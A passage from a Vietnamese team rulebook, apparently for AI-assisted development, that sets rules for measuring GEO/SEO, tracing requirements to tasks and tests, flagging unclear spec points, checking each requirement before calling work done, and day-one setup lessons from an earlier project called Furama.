- **Luật:** câu hỏi chính của trang được trả lời trong 1–2 câu ĐẦU của đoạn (rồi mới giải thích); dữ kiện là con số,
  tên, giờ, giá có thật (N23), không tính từ chung chung; mỗi trang có tác giả/đơn vị chịu trách nhiệm và
  `dateModified` thật (chỉ đổi khi NỘI DUNG đổi — bump ngày để "tươi" là khai man, N23). Nội dung chính nằm trong HTML
  tĩnh (N46): phần lớn bot AI không chạy JS.
- **Bài học gốc (rủi ro đã biết):** trợ lý AI trích những đoạn tự đứng được; đoạn mở bằng giới thiệu thương hiệu, hoặc
  câu trả lời nằm trong tab/accordion dựng bằng JS, thì không được trích — và trang đối thủ trả lời thẳng được trích thay.

### N80 — GEO và SEO phải ĐO được: bộ câu hỏi cố định, kênh AI trong analytics, Search Console + Bing
- **Luật:** (1) Search Console + Bing Webmaster Tools xác minh từ ngày ra mắt, sitemap đã gửi, lỗi index xem mỗi tháng;
  Bing có IndexNow (ChatGPT Search và Copilot dựa nhiều vào chỉ mục Bing). (2) Analytics có kênh riêng cho nguồn AI
  (`chatgpt.com`, `perplexity.ai`, `gemini.google.com`, `copilot.microsoft.com`, `claude.ai`). (3) Một **bộ câu hỏi
  GEO** cố định (`docs/tri-thuc/geo-bo-cau-hoi.md`) hỏi lại các trợ lý theo quý, ghi nguyên văn: có nhắc thương hiệu
  không, trích URL nào, dữ kiện nào SAI. Dữ kiện sai ⇒ tìm nguồn sai (N77), không chỉ sửa trang mình.
- **Bài học gốc (rủi ro đã biết):** không đo thì "tối ưu GEO" chỉ là cảm giác; và AI trích giờ mở cửa cũ thì không ai
  trong đội biết cho tới khi khách phàn nàn.

---

## Q. Truy vết yêu cầu — phỏng theo github/spec-kit (MIT), CHƯA qua dự án thật (1.5)

Như mục P: "Bài học gốc" ghi rủi ro đã biết, thay bằng cạm bẫy thật sau dự án đầu tiên áp dụng. Ba luật này nối
đuôi N06 (spec trước code), N40 (kiểm bằng thứ thật) và N57 (chính sách là của chủ dự án) — không thay chúng.

### N81 — Yêu cầu có MÃ; task, phép thử và báo cáo kiểm trỏ về mã — truy vết HAI chiều
- **Luật:** spec đánh mã mỗi yêu cầu (`YC-01`) và tiêu chí đo được (`TC-01`); mã KHÔNG BAO GIỜ đổi số, yêu cầu bỏ thì
  ghi "(bỏ DD/MM — vì …)" chứ không xoá dòng. Task trong plan ghi `→ YC-xx`; mỗi YC có ≥ 1 task, task không phục vụ
  YC nào phải nói vì sao. Báo cáo kiểm định có một dòng cho MỖI YC/TC. Tính năng nhiều phần chia lát P1/P2… mà mỗi lát
  làm xong riêng vẫn dùng và kiểm được.
- **Bài học gốc (rủi ro đã biết):** "Thành công khi" một kịch bản bắt được luồng chính nhưng không bắt được yêu cầu
  phụ bị bỏ quên — yêu cầu thứ 6 trong spec không có task nào, và không ai thấy vì không có bảng nào đếm. Ngược lại, code
  "tiện tay làm thêm" không ai yêu cầu cũng lọt qua review vì không có gì để so.

### N82 — Chỗ chưa rõ ĐÁNH DẤU, không đoán im lặng; mặc định tự chọn thì VIẾT RA để chủ dự án bác được
- **Luật:** spec đánh `[CẦN LÀM RÕ · chính sách|kỹ thuật: <câu hỏi cụ thể>]` ở chỗ chưa có quyết định; còn dấu chính
  sách ⇒ không qua cổng duyệt. Câu kỹ thuật đội tự chốt được ⇒ không hỏi, ghi vào *Giả định* kèm lý do. Hỏi ≤ 5 câu
  nặng nhất mỗi lượt, gộp MỘT lượt, mỗi câu có đề xuất (`/lam-ro-yeu-cau`); câu trả lời ghi NGƯỢC vào spec (mục Làm
  rõ + sửa đúng chỗ), không để lại trong chat. Tính từ không đo được ("nhanh", "an toàn") trong YC/TC là chỗ chưa rõ.
- **Bài học gốc (rủi ro đã biết):** agent gặp chỗ trống sẽ lấp bằng mặc định "hợp lý" mà không nói — và mặc định đó
  hiện ra lần đầu ở production. Câu trả lời nằm trong chat thì phiên sau không thấy, người sau hỏi lại hoặc làm ngược.

### N83 — Lời "xong" và dấu `[x]` không phải bằng chứng: đối chiếu TỪNG yêu cầu với code và thứ thật
- **Luật:** trước khi báo xong, `kiem-dinh-vien` xếp mỗi YC/TC: Đạt (có bằng chứng thật) · Thiếu · Một phần · Trái —
  cộng mục **Ngoài yêu cầu** (code làm thứ spec không đòi). Khoảng trống thành *Đợt bổ sung* CHỈ THÊM vào cuối plan,
  không sửa/đánh số lại task cũ; làm rồi đối chiếu lại tới khi hết. Kịch bản đã định mà không chạy được ⇒ kết luận tối
  đa "ĐẠT MỘT PHẦN". Trước khi code, `/soat-cheo-tai-lieu` (chỉ đọc, người soát không phải người viết plan) đối chiếu
  spec ↔ thiết kế ↔ plan cùng một lúc.
- **Bài học gốc (rủi ro đã biết):** plan đánh dấu đủ `[x]` trong khi một nhánh của yêu cầu chưa từng được viết; kỹ sư
  tin dấu của mình, người kiểm tin lời kỹ sư. Sửa lại task cũ để "khớp" thì mất dấu vết việc gì đã thiếu.

---

## L. Ở dự án mới, làm KHÁC Furama ngay từ ngày đầu

Những điều Furama trả giá vì làm muộn. Đội áp dụng từ ngày 1 của dự án mới:

| # | Làm ngay | Vì Furama đã trả giá |
|---|---|---|
| L1 | `git init` + nhánh tính năng từ ngày đầu; `.gitignore` chặn `.env*` trước commit đầu tiên | những tuần đầu không có lịch sử để so, để lùi |
| L2 | Tách DB dev / staging / production | phần lớn cạm bẫy N32 và mọi lá chắn ở N59 sinh ra vì DB dev dùng chung production |
| L3 | Test runner (`node --test`) cạnh script check | phép thử chỉ tới muộn, sau nhiều lần lỗi lặp |
| L4 | `CLAUDE.md` có giới hạn kích thước (N05) | phình tới 320KB, nạp vào mọi phiên |
| L5 | Một file hướng dẫn cho mọi công cụ (N04) | `AGENTS.md` lệch `CLAUDE.md` |
| L6 | Kiểm hạn mức gói miễn phí TRƯỚC khi chọn kiến trúc media/DB, đặt cảnh báo hạn mức | vượt egress → cả site 402 |
| L7 | Bộ đếm/rate limit in-memory ghi rõ là tạm, kèm kế hoạch chuyển store thật | nhiều instance chia nhỏ bộ đếm |
| L8 | Envelope lỗi + class lỗi hạ tầng + hàm ánh xạ lỗi có từ route đầu tiên | phải đi sửa lại từng route catch phẳng |
| L9 | Kiến trúc module + phép kiểm ranh giới (`lint:arch` / `architecture_test`) từ commit đầu (N63) | IConcierge dựng ranh giới khi đã có keo xuyên mọi thư mục — phải strangle nhiều tháng |
| L10 | Có app di động ⇒ keystore release + cổng phiên bản từ bản phát hành ĐẦU TIÊN (N72, N73) | máy ký khác nhau không cài đè được nhau; máy cũ không có đường biết mình cũ |
| L11 | Có trang công khai ⇒ TRƯỚC ngày ra mắt: Search Console + Bing xác minh, quyết định bot AI ghi vào `CLAUDE.md`, NAP + giờ một nguồn khớp Google Business (N77, N78, N80) | chưa có bài học gốc — mục P chưa qua dự án thật |
